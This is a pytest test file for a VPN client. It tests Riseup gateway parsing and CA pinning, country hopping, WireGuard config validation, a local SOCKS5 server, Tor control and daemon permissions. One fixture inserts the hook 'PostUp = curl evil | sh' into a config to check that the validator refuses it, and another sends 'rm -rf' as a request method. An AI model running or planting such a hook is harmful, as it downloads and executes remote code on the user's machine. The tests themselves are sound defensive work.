"""NEOX VPN without root or the network: Riseup's API parsing and CA pin, gateway choice, hopping
(fake clock), WireGuard checks, the SOCKS5 server (real, on localhost), Tor's control protocol
(a fake control socket), the whole-computer rules, and neox-vpnd's API and permissions."""
from __future__ import annotations

import asyncio
import json
import os
import random
import socket
import struct
import threading
import time
from pathlib import Path

import pytest

from neox_vpn import daemon as D
from neox_vpn import riseup as R
from neox_vpn import socks as S
from neox_vpn import system as SY
from neox_vpn import tor as T
from neox_vpn import wireguard as W
from neox_vpn.hop import Hopper

EIP = {
    "locations": {"paris": {"name": "Paris", "country_code": "FR"},
                  "amsterdam": {"name": "Amsterdam", "country_code": "NL"},
                  "montreal": {"name": "Montreal", "country_code": "CA"}},
    "gateways": [
        {"host": "vpn03-par.riseup.net", "ip_address": "1.1.1.3", "location": "paris",
         "capabilities": {"transport": [{"type": "openvpn", "ports": ["53", "1194"], "protocols": ["tcp", "udp"]}]}},
        {"host": "vpn14-par.riseup.net", "ip_address": "1.1.1.14", "location": "paris",
         "capabilities": {"transport": [{"type": "openvpn", "ports": ["443"], "protocols": ["tcp"]}]}},
        {"host": "vpn13-ams.riseup.net", "ip_address": "2.2.2.13", "location": "amsterdam",
         "capabilities": {"transport": [{"type": "openvpn", "ports": ["1194"], "protocols": ["udp"]},
                                        {"type": "obfs4", "ports": ["443"]}]}},
        {"host": "bridge.riseup.net", "ip_address": "3.3.3.3", "location": "montreal",
         "capabilities": {"transport": [{"type": "obfs4", "ports": ["443"]}]}},
    ],
    "openvpn_configuration": {"cipher": "AES-256-GCM", "auth": "SHA512", "tls-version-min": "1.2"},
}
CERT = ("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----\n"
        "-----BEGIN CERTIFICATE-----\nBBBB\n-----END CERTIFICATE-----\n")
KEY = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="          # any 32 bytes, base64
PUB = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="
WG = f"""[Interface]
PrivateKey = {KEY}
Address = 10.2.0.2/32, fd00::2/128
DNS = 10.2.0.1
[Peer]
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51820
"""


# ---------------------------------------------------------------- Riseup
def test_gateways_only_openvpn_with_city_and_country():
    gws = R.parse_gateways(EIP)
    assert [g.host for g in gws] == ["vpn03-par.riseup.net", "vpn14-par.riseup.net", "vpn13-ams.riseup.net"]
    assert gws[0].location == "Paris" and gws[0].country == "FR"


def test_openvpn_config_names_and_namespace_hook():
    gw = R.parse_gateways(EIP)[0]
    cfg = R.openvpn_config(gw, EIP["openvpn_configuration"], "CA-PEM", CERT, netns_up="/usr/lib/neox/vpn/neox-vpn-up")
    lines = cfg.splitlines()
    assert "remote 1.1.1.3 1194 udp" in lines
    assert "verify-x509-name vpn03-par name" in lines        # the gateways' CN is the short name
    assert "dev tun" in lines and "remote-cert-tls server" in lines
    for opt in ("ifconfig-noexec", "route-noexec", "up /usr/lib/neox/vpn/neox-vpn-up"):
        assert opt in lines
    assert "BBBB" in cfg and "AAAA" in cfg
    assert "explicit-exit-notify 1" in lines                  # UDP: the gateway learns we left
    tcp_only = R.openvpn_config(R.parse_gateways(EIP)[1], {}, "CA", CERT)
    assert "remote 1.1.1.14 443 tcp" in tcp_only and "explicit-exit-notify" not in tcp_only
    plain = R.openvpn_config(gw, {}, "CA", CERT)
    assert "route-noexec" not in plain
    with pytest.raises(R.RiseupError):
        R.openvpn_config(gw, {}, "CA", "-----BEGIN CERTIFICATE-----\nx\n-----END CERTIFICATE-----")


def _provider(fp=R.CA_FINGERPRINT, anon=True):
    return json.dumps({"service": {"allow_anonymous": anon}, "ca_cert_fingerprint": f"SHA256: {fp}",
                       "ca_cert_uri": "https://black.riseup.net/ca.crt",
                       "api_uri": "https://api.black.riseup.net:4430", "api_version": "3"}).encode()


@pytest.mark.parametrize("provider_fp,real_fp,ok", [
    (R.CA_FINGERPRINT, R.CA_FINGERPRINT, True),
    (R.CA_FINGERPRINT, "00" * 32, False),          # the CA served is not the pinned one
    ("11" * 32, "11" * 32, False),                 # provider.json and CA agree, but not with our pin
])
def test_ca_pin(tmp_path, monkeypatch, provider_fp, real_fp, ok):
    urls = []

    def get(url, ctx=None, timeout=20):
        urls.append(url)
        if url.endswith("provider.json"):
            return _provider(provider_fp)
        if url.endswith("ca.crt"):
            return b"CA-PEM"
        return json.dumps(EIP).encode()
    monkeypatch.setattr(R, "_get", get)
    monkeypatch.setattr(R, "pem_fingerprint", lambda pem: real_fp)
    monkeypatch.setattr(R.Riseup, "_ctx", lambda self: None)
    r = R.Riseup(tmp_path)
    if ok:
        r.refresh()
        assert urls[-1] == "https://api.black.riseup.net:4430/3/config/eip-service.json"
        assert {l["city"] for l in r.locations()} == {"Paris", "Amsterdam"}
    else:
        with pytest.raises(R.RiseupError, match="pinned"):
            r.refresh()
        assert not any("eip-service" in u for u in urls)  # nothing else is fetched


def test_no_anonymous_access_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(R, "_get", lambda url, ctx=None, timeout=20: _provider(anon=False))
    with pytest.raises(R.RiseupError, match="anonymous"):
        R.Riseup(tmp_path).refresh()


def test_pick_by_city_country_and_exclude(tmp_path):
    r = R.Riseup(tmp_path)
    r.eip = EIP
    assert r.pick("Amsterdam").host == "vpn13-ams.riseup.net"
    assert r.pick("NL").host == "vpn13-ams.riseup.net"
    assert r.pick("Paris", exclude="vpn03-par.riseup.net").host == "vpn14-par.riseup.net"
    assert r.pick(None, rng=random.Random(1)).host in {g.host for g in R.parse_gateways(EIP)}
    with pytest.raises(R.RiseupError, match="no gateway in Tokyo"):
        r.pick("Tokyo")


# ---------------------------------------------------------------- hopping
class Clock:
    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


def test_hopper_every_x_minutes_in_order():
    c = Clock()
    h = Hopper(2, ["Paris", "Amsterdam", "Montreal"], clock=c)
    assert not h.due() and h.seconds_left() == 120
    c.t += 119
    assert not h.due()
    c.t += 1
    assert h.due()
    assert h.next("Paris") == "Amsterdam" and h.seconds_left() == 120
    assert h.next("Montreal") == "Paris"
    assert h.next("elsewhere") == "Paris"


def test_hopper_random_never_stays():
    h = Hopper(1, ["us", "de", "nl"], order="random", clock=Clock(), rng=random.Random(4))
    for _ in range(50):
        assert h.next("de") != "de"


@pytest.mark.parametrize("minutes,places", [(0.5, ["a", "b"]), (5, ["a"]), (5, [])])
def test_hopper_limits(minutes, places):
    with pytest.raises(ValueError):
        Hopper(minutes, places)


# ---------------------------------------------------------------- WireGuard
def test_wireguard_parse_and_setconf():
    c = W.parse(WG)
    assert c.addresses == ["10.2.0.2/32", "fd00::2/128"] and c.dns == ["10.2.0.1"]
    sc = W.setconf(c)
    assert "Address" not in sc and "DNS" not in sc and f"PublicKey = {PUB}" in sc


@pytest.mark.parametrize("change,err", [
    (lambda t: t.replace("DNS = 10.2.0.1", "DNS = 10.2.0.1\nPostUp = curl evil | sh"), "runs commands"),
    (lambda t: t.replace(KEY, "notakey"), "PrivateKey"),
    (lambda t: t.replace("203.0.113.5:51820", "203.0.113.5"), "Endpoint"),
    (lambda t: t.split("[Peer]")[0], "no \\[Peer\\]"),
    (lambda t: t.replace("Address = 10.2.0.2/32, fd00::2/128\n", ""), "Address"),
    (lambda t: t + "Bogus = 1\n", "unknown"),
])
def test_wireguard_refuses_bad_configs(change, err):
    with pytest.raises((W.WireGuardError, ValueError), match=err):
        W.parse(change(WG))


def test_wireguard_store(tmp_path):
    st = W.Store(tmp_path / "wg")
    a = st.add("US-FREE#12.conf", WG)
    b = st.add("US-FREE#12.conf", WG, label="", country="")
    assert a["country"] == "US" and a["id"] != b["id"]
    assert oct((tmp_path / "wg").stat().st_mode & 0o777) == "0o700"
    assert oct((tmp_path / "wg" / f"{a['id']}.conf").stat().st_mode & 0o777) == "0o600"
    meta, cfg, text = st.get(a["id"])
    assert cfg.private_key == KEY and text == WG
    assert st.remove(a["id"]) and not st.remove(a["id"])
    assert [i["id"] for i in st.items()] == [b["id"]]
    with pytest.raises(W.WireGuardError):
        st.add("x.conf", "[Interface]\nPrivateKey = nope\n")
    assert W.country_from_name("de-fra-01.conf") == "DE" and W.country_from_name("work.conf") == ""


# ---------------------------------------------------------------- SOCKS5
@pytest.fixture
def socks_server():
    loop = asyncio.new_event_loop()
    ready = threading.Event()
    box = {}

    async def start():
        async def echo(r, w):
            w.write(b"hello:" + await r.read(100))
            await w.drain()
            w.close()
        box["echo"] = await asyncio.start_server(echo, "127.0.0.1", 0)
        box["socks"] = await S.serve("127.0.0.1", 0)
        ready.set()
    t = threading.Thread(target=lambda: (loop.run_until_complete(start()), loop.run_forever()), daemon=True)
    t.start()
    ready.wait(5)
    yield box["socks"].sockets[0].getsockname()[1], box["echo"].sockets[0].getsockname()[1]
    loop.call_soon_threadsafe(loop.stop)


def _socks(port, atyp_addr: bytes, dport: int, cmd: int = 1, methods=b"\x00") -> tuple[socket.socket, bytes]:
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    s.sendall(b"\x05" + bytes([len(methods)]) + methods)
    choice = s.recv(2)
    if choice != b"\x05\x00":
        return s, choice
    s.sendall(bytes([5, cmd, 0]) + atyp_addr + struct.pack("!H", dport))
    return s, s.recv(10)


def test_socks_connect_ip_and_name(socks_server):
    sport, eport = socks_server
    for addr in (b"\x01" + socket.inet_aton("127.0.0.1"), b"\x03\x09localhost"):
        s, rep = _socks(sport, addr, eport)
        assert rep[1] == S.REPLY_OK
        s.sendall(b"neox")
        assert s.recv(100) == b"hello:neox"
        s.close()


def test_socks_refusals(socks_server):
    sport, eport = socks_server
    s, rep = _socks(sport, b"\x01" + socket.inet_aton("127.0.0.1"), eport, cmd=2)       # BIND
    assert rep[1] == S.REPLY_CMD
    s, rep = _socks(sport, b"\x03\x04caf\xe9", eport)                                    # not ASCII
    assert rep[1] == S.REPLY_HOST
    s, rep = _socks(sport, b"\x01" + socket.inet_aton("127.0.0.1"), 1)                  # nothing listening
    assert rep[1] == S.REPLY_REFUSED
    s, choice = _socks(sport, b"", 0, methods=b"\x02")                                  # password only
    assert choice == b"\x05\xff"


# ---------------------------------------------------------------- Tor
def test_torrc():
    rc = T.torrc(Path("/var/lib/neox-vpn/tor"), Path("/run/neox-vpn/tor.ctl"), "DE", system=False)
    assert "SocksPort 127.0.0.1:9060" in rc and "ExitNodes {de}" in rc and "StrictNodes 1" in rc
    assert "TransPort" not in rc
    rc = T.torrc(Path("/d"), Path("/c"), None, system=True)
    assert "TransPort 127.0.0.1:9061" in rc and "DNSPort 127.0.0.1:5354" in rc and "ExitNodes" not in rc


def test_tor_control_changes_country(tmp_path):
    run = tmp_path / "run"
    (run / "tor").mkdir(parents=True)
    (tmp_path / "tor").mkdir()
    (tmp_path / "tor" / "control_auth_cookie").write_bytes(b"\x01\x02")
    seen = []
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(run / "tor" / "control"))
    srv.listen(1)

    def fake_tor():
        conn, _ = srv.accept()
        f = conn.makefile("rb")
        for line in f:
            line = line.decode().strip()
            seen.append(line)
            if line.startswith("AUTHENTICATE") and line != "AUTHENTICATE 0102":
                conn.sendall(b"515 Authentication failed\r\n")
            else:
                conn.sendall(b"250 OK\r\n")
        conn.close()
    threading.Thread(target=fake_tor, daemon=True).start()
    T.TorBackend(tmp_path, run).set_country("NL")
    time.sleep(0.2)
    assert seen == ["AUTHENTICATE 0102", "SETCONF ExitNodes={nl} StrictNodes=1", "SIGNAL NEWNYM"]


def test_tor_control_error(tmp_path):
    a, b = socket.socketpair()
    b.sendall(b"552 Unrecognized option\r\n")
    c = T.Control.__new__(T.Control)
    c.s, c.f = a, a.makefile("rb")
    with pytest.raises(T.TorError, match="552"):
        c.cmd("SETCONF Bogus=1")


# ---------------------------------------------------------------- whole computer
def test_tor_rules_text():
    r = SY.tor_rules()
    assert 'meta skuid "debian-tor" return' in r and 'meta skuid "debian-tor" accept' in r
    assert "redirect to :9061" in r and "udp dport 53 redirect to :5354" in r
    assert "meta nfproto ipv6 drop" in r and "meta l4proto udp drop" in r
    assert f"ip daddr {T.VIRTUAL_NET} meta l4proto tcp redirect to :9061" in r
    # DNS is redirected before the LAN exemption (a LAN resolver must not see the names)
    assert r.index("udp dport 53") < r.index("ip daddr {")


def test_system_openvpn_config_drops_unsupported():
    gw = R.parse_gateways(EIP)[0]
    cfg = SY.system_openvpn_config(R.openvpn_config(gw, {}, "CA", CERT))
    assert "auth-nocache" not in cfg and "nobind" not in cfg and "verb 3" not in cfg
    assert "verify-x509-name vpn03-par name" in cfg


# ---------------------------------------------------------------- neox-vpnd
class FakeTor:
    def __init__(self):
        self.calls = []
        self.fail = False

    def start(self, country, system, timeout=120):
        self.calls.append(("start", country, system))

    def set_country(self, country):
        if self.fail:
            raise T.TorError("no exits in that country right now")
        self.calls.append(("country", country))

    def stop(self):
        self.calls.append(("stop",))


@pytest.fixture
def vpn(tmp_path, monkeypatch):
    monkeypatch.setattr(D.system, "cleanup", lambda: None)
    monkeypatch.setattr(D.system, "tor_on", lambda: None)
    monkeypatch.setattr(D.netns, "destroy", lambda: None)
    v = D.VPN(tmp_path / "state", tmp_path / "run")
    v.tor = FakeTor()
    sock = tmp_path / "run" / "vpn.sock"
    srv = D.serve(v, sock)
    yield v, sock
    srv.close()


def test_api_permissions(vpn):
    v, sock = vpn
    v.authorized = lambda peer: False
    assert D.request("status", path=sock) == {"ok": True, "connected": False, "connection": None, "error": None}
    for m, p in (("connect", {"backend": "tor", "scope": "neox"}), ("disconnect", {}),
                 ("import_wireguard", {"filename": "a.conf", "text": WG}), ("remove_wireguard", {"id": "a"})):
        r = D.request(m, p, path=sock)
        assert not r["ok"] and "not allowed" in r["error"], m
    assert v.tor.calls == [] and v.wg.items() == []
    assert not D.request("bogus", path=sock)["ok"]
    assert D.request("providers", path=sock)["wireguard"] == []


def test_api_import_and_validation(vpn):
    v, sock = vpn
    v.authorized = lambda peer: True
    r = D.request("import_wireguard", {"filename": "DE-1.conf", "text": WG}, path=sock)
    assert r["ok"] and r["imported"]["country"] == "DE"
    r = D.request("import_wireguard", {"filename": "x.conf", "text": WG.replace(PUB, "bad")}, path=sock)
    assert not r["ok"] and "PublicKey" in r["error"]
    r = D.request("connect", {"backend": "pptp", "scope": "neox"}, path=sock)
    assert not r["ok"] and "unknown VPN" in r["error"]
    r = D.request("connect", {"backend": "tor", "scope": "everything"}, path=sock)
    assert not r["ok"] and "whole computer" in r["error"]
    r = D.request("connect", {"backend": "tor", "scope": "neox", "hop": {"minutes": 0.2, "places": ["us", "de"]}},
                  path=sock)
    assert not r["ok"] and "once a minute" in r["error"]


def test_tor_connect_hop_and_disconnect(vpn):
    v, sock = vpn
    v.authorized = lambda peer: True
    r = D.request("connect", {"backend": "tor", "scope": "neox", "place": "us",
                              "hop": {"minutes": 1, "places": ["us", "de", "nl"]}}, path=sock)
    assert r["ok"] and r["connected"]
    c = r["connection"]
    assert c["proxy"] == {"scheme": "socks5", "host": "127.0.0.1", "port": 9060}
    assert c["country"] == "US" and c["hop"]["seconds_left"] == 60
    clock = Clock()
    v.hopper.clock, v.hopper.next_at = clock, clock.t + 60
    v.tick()
    assert v.conn["place"] == "us"                            # not yet
    clock.t += 60
    v.tick()
    assert v.conn["place"] == "de" and ("country", "de") in v.tor.calls
    # a failed hop keeps the list going and says so
    v.tor.fail = True
    clock.t += 60
    v.tick()
    assert v.conn["state"] == "retrying" and "could not hop to nl" in v.status()["error"]
    assert v.hopper.seconds_left() == 30
    v.tor.fail = False
    clock.t += 30
    v.tick()
    assert v.conn["place"] == "us" and v.conn["state"] == "up" and v.status()["error"] is None
    r = D.request("disconnect", path=sock)
    assert r["ok"] and not r["connected"] and v.hopper is None


def test_system_scope_has_no_proxy(vpn):
    v, sock = vpn
    v.authorized = lambda peer: True
    r = D.request("connect", {"backend": "tor", "scope": "system", "place": "se"}, path=sock)
    assert r["ok"] and r["connection"]["proxy"] is None and ("start", "se", True) in v.tor.calls


def test_failed_connect_cleans_up(vpn, monkeypatch):
    v, sock = vpn
    v.authorized = lambda peer: True
    downs = []
    monkeypatch.setattr(D.system, "cleanup", lambda: downs.append(1))

    def boom(self, scope, place, exclude=None):
        raise R.RiseupError("cannot reach Riseup (black.riseup.net): timed out")
    monkeypatch.setattr(D.VPN, "_riseup_up", boom)
    r = D.request("connect", {"backend": "riseup", "scope": "neox", "place": "Paris"}, path=sock)
    assert not r["ok"] and "cannot reach Riseup" in r["error"]
    st = D.request("status", path=sock)
    assert st["connected"] is False and st["connection"] is None and "cannot reach" in st["error"]
    assert len(downs) >= 2                                   # before connecting, and after failing


def test_neox_host_relays_vpn_requests(vpn, monkeypatch, tmp_path):
    import io

    from aira import neox_host
    v, sock = vpn
    v.authorized = lambda peer: False
    out = []
    h = neox_host.Host(io.BytesIO(), io.BytesIO(), sock_path=tmp_path / "x.sock")
    h.to_ext = out.append
    monkeypatch.setattr(neox_host, "VPN_SOCKET", sock)
    h.vpn({"id": "v1", "method": "status"})
    h.vpn({"id": "v2", "method": "connect", "params": {"backend": "tor", "scope": "neox"}})
    h.vpn({"id": "v3", "method": "rm -rf"})
    assert out[0]["type"] == "vpn_result" and out[0]["id"] == "v1" and out[0]["connected"] is False
    assert not out[1]["ok"] and "not allowed" in out[1]["error"]
    assert not out[2]["ok"] and "unknown VPN request" in out[2]["error"]
    monkeypatch.setattr(neox_host, "VPN_SOCKET", tmp_path / "nothing.sock")
    h.vpn({"id": "v4", "method": "status"})
    assert out[3]["service"] is False and "isn't running" in out[3]["error"]
